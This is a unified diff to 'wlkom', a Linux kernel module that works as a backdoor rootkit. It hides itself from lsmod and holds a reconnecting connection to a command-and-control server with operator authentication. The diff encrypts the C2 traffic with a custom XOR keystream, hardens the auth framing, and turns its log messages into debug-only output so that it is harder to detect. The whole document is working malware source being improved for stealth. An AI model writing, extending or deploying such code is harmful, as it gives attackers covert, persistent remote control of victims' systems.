@@ -8,9 +8,11 @@
 #include <linux/list.h>
 #include <net/sock.h>
 
-#define RETRY_DELAY 5
+#define RETRY_DELAY 3
 #define AUTH_PREFIX "AUTH "
 #define AUTH_PREFIX_LEN (sizeof(AUTH_PREFIX) - 1)
+#define AUTH_HASH_LEN 8
+#define AUTH_FRAME_LEN (AUTH_PREFIX_LEN + AUTH_HASH_LEN + 1)
 #define TMP_OUT_FILE "/tmp/.wlkom_out"
 #define TMP_ERR_FILE "/tmp/.wlkom_err"
 
@@ -28,8 +30,32 @@ static struct task_struct *conn_thread = NULL;
 static struct socket      *conn_sock   = NULL;
 static struct list_head   *module_prev = NULL;
 static bool                module_hidden = false;
+static u32                 cipher_key = 0;
+static u32                 tx_pos = 0;
+static u32                 rx_pos = 0;
 
 static void *to_sockaddr(void *ptr) { return ptr; }
+
+static u8 keystream_byte(u32 key, u32 pos)
+{
+    u32 x = key + pos * 0x9E3779B1U;
+
+    x ^= x >> 16;
+    x *= 0x85ebca6bU;
+    x ^= x >> 13;
+    x *= 0xc2b2ae35U;
+    x ^= x >> 16;
+
+    return (u8)x;
+}
+
+static void crypt_buffer(char *buf, size_t len, u32 key, u32 *pos)
+{
+    while (len-- > 0) {
+        *buf++ ^= keystream_byte(key, *pos);
+        (*pos)++;
+    }
+}
 
 static int recv_line(char *buf, size_t size)
 {
@@ -50,6 +76,7 @@ static int recv_line(char *buf, size_t size)
         if (ret <= 0)
             return ret;
 
+        crypt_buffer(&buf[pos], 1, cipher_key, &rx_pos);
         if (buf[pos] == '\n') {
             buf[pos] = '\0';
             if (pos > 0 && buf[pos - 1] == '\r')
@@ -64,15 +91,72 @@ static int recv_line(char *buf, size_t size)
     return -EMSGSIZE;
 }
 
+static int recv_exact_decrypted(char *buf, size_t size)
+{
+    size_t done = 0;
+
+    while (done < size && !kthread_should_stop()) {
+        struct msghdr msg = { 0 };
+        struct kvec vec = {
+            .iov_base = buf + done,
+            .iov_len = size - done,
+        };
+        int ret;
+
+        ret = kernel_recvmsg(conn_sock, &msg, &vec, 1, vec.iov_len, 0);
+        if (ret <= 0)
+            return ret ? ret : -ECONNRESET;
+
+        crypt_buffer(buf + done, ret, cipher_key, &rx_pos);
+        done += ret;
+    }
+
+    return done == size ? (int)done : -EINTR;
+}
+
+static int recv_auth_frame(char *buf, size_t size)
+{
+    int ret;
+
+    if (size < AUTH_FRAME_LEN + 1)
+        return -EINVAL;
+
+    ret = recv_exact_decrypted(buf, AUTH_FRAME_LEN);
+    if (ret < 0)
+        return ret;
+
+    buf[AUTH_FRAME_LEN] = '\0';
+    return ret;
+}
+
 static int send_reply(const char *reply)
 {
-    struct msghdr msg = { 0 };
-    struct kvec vec = {
-        .iov_base = (void *)reply,
-        .iov_len = strlen(reply),
-    };
+    size_t len = strlen(reply);
 
-    return kernel_sendmsg(conn_sock, &msg, &vec, 1, vec.iov_len);
+    while (len > 0) {
+        char tmp[256];
+        size_t chunk = len < sizeof(tmp) ? len : sizeof(tmp);
+        struct msghdr msg = { 0 };
+        struct kvec vec = {
+            .iov_base = tmp,
+            .iov_len = chunk,
+        };
+        u32 pos = tx_pos;
+        int ret;
+
+        memcpy(tmp, reply, chunk);
+        crypt_buffer(tmp, chunk, cipher_key, &pos);
+
+        ret = kernel_sendmsg(conn_sock, &msg, &vec, 1, vec.iov_len);
+        if (ret <= 0)
+            return ret ? ret : -ECONNRESET;
+
+        tx_pos += ret;
+        reply += ret;
+        len -= ret;
+    }
+
+    return 0;
 }
 
 static void hide_module_from_lsmod(void)
@@ -217,12 +301,16 @@ static int authenticate_c2(void)
     int ret;
 
     memset(buf, 0, sizeof(buf));
-    ret = recv_line(buf, sizeof(buf));
-    if (ret <= 0)
-        return ret ? ret : -ECONNRESET;
+    ret = recv_auth_frame(buf, sizeof(buf));
+    if (ret < 0)
+        return ret;
 
     if (strncmp(buf, AUTH_PREFIX, AUTH_PREFIX_LEN) != 0)
         return -EACCES;
+    if (buf[AUTH_PREFIX_LEN + AUTH_HASH_LEN] != '\n')
+        return -EACCES;
+
+    buf[AUTH_PREFIX_LEN + AUTH_HASH_LEN] = '\0';
 
     received_hash = buf + AUTH_PREFIX_LEN;
     if (strcmp(received_hash, password_hash) != 0)
@@ -274,21 +362,24 @@ static int connection_thread(void *data)
     while (!kthread_should_stop()) {
         ret = do_connect();
         if (ret < 0) {
-            pr_err("wlkom: C2 unreachable (%d), retry in %ds\n",
-                   ret, RETRY_DELAY);
+            pr_debug("wlkom: C2 unreachable (%d), retry in %ds\n",
+                     ret, RETRY_DELAY);
             schedule_timeout_interruptible(HZ * RETRY_DELAY);
             continue;
         }
 
-        pr_info("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);
+        tx_pos = 0;
+        rx_pos = 0;
+
+        pr_debug("wlkom: connected to C2 %s:%d\n", c2_ip, c2_port);
 
         ret = authenticate_c2();
         if (ret < 0) {
-            pr_warn("wlkom: C2 authentication failed (%d)\n", ret);
+            pr_debug("wlkom: C2 authentication failed (%d)\n", ret);
             goto disconnect;
         }
 
-        pr_info("wlkom: C2 authenticated\n");
+        pr_debug("wlkom: C2 authenticated\n");
 
         while (!kthread_should_stop()) {
             memset(buf, 0, sizeof(buf));
@@ -310,7 +401,7 @@ disconnect:
         kernel_sock_shutdown(conn_sock, SHUT_RDWR);
         sock_release(conn_sock);
         conn_sock = NULL;
-        pr_info("wlkom: disconnected from C2, retry in %ds\n", RETRY_DELAY);
+        pr_debug("wlkom: disconnected from C2, retry in %ds\n", RETRY_DELAY);
         schedule_timeout_interruptible(HZ * RETRY_DELAY);
     }
 
@@ -324,7 +415,12 @@ static int __init wlkom_init(void)
         return -EINVAL;
     }
 
-    pr_info("wlkom: loaded\n");
+    if (kstrtouint(password_hash, 16, &cipher_key) < 0) {
+        pr_err("wlkom: invalid password_hash format\n");
+        return -EINVAL;
+    }
+
+    pr_debug("wlkom: loaded\n");
     hide_module_from_lsmod();
 
     conn_thread = kthread_run(connection_thread, NULL, "wlkom_conn");
@@ -352,7 +448,7 @@ static void __exit wlkom_exit(void)
 
     show_module_in_lsmod();
 
-    pr_info("wlkom: unloaded\n");
+    pr_debug("wlkom: unloaded\n");
 }
 
 module_init(wlkom_init);
